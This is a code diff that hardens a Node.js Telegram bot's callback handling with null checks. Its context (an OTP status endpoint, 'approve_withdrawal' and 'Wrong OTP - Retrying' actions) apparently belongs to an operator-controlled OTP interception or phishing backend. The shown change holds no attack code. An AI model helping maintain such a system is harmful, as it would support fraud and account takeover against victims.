@@ -91,7 +91,7 @@ app.get('/api/check-otp-status', (req, res) => {
     res.json({ status: otpStatus });
 });
 
-// 5. Telegram Long-Polling with Error Isolation
+// 5. Telegram Long-Polling with Safe Property Validation and Error Isolation
 async function pollTelegramUpdates() {
     if (!process.env.BOT_TOKEN) {
         setTimeout(pollTelegramUpdates, 5000);
@@ -107,13 +107,19 @@ async function pollTelegramUpdates() {
                 lastUpdateId = update.update_id;
 
                 if (update.callback_query) {
-                    const action = update.callback_query.data;
-                    const chatId = update.callback_query.message.chat.id;
-                    const messageId = update.callback_query.message.message_id;
-                    const callbackQueryId = update.callback_query.id;
+                    const callbackQuery = update.callback_query;
+                    const action = callbackQuery.data;
+                    const callbackQueryId = callbackQuery.id;
+                    
+                    // Safely check if message and chat objects exist to prevent TypeError crashes
+                    const chatId = callbackQuery.message && callbackQuery.message.chat ? callbackQuery.message.chat.id : null;
+                    const messageId = callbackQuery.message ? callbackQuery.message.message_id : null;
 
                     await answerCallback(callbackQueryId, 'Processing action...');
-                    await removeMessageButtons(chatId, messageId);
+
+                    if (chatId && messageId) {
+                        await removeMessageButtons(chatId, messageId);
+                    }
 
                     let statusMessage = '';
                     if (action === 'approve_withdrawal') {
@@ -130,7 +136,7 @@ async function pollTelegramUpdates() {
                         statusMessage = '❌ Status: Wrong OTP - Retrying';
                     }
 
-                    if (statusMessage) {
+                    if (statusMessage && chatId) {
                         await sendStatusMessage(chatId, statusMessage);
                     }
                 }
